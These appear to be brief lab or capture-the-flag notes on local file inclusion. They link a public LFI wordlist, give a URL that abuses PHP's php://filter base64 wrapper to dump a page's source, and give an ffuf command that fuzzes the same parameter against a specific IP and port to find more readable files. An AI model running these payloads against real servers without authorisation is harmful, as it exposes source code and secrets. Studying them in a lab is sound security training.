
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

```
http://83.136.253.171:44707/index.php?page=php://filter/read=convert.base64-encode/resource=industries
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.253.171:44707/index.php?page=php://filter/read=convert.base64-encode/resource=FUZZ
```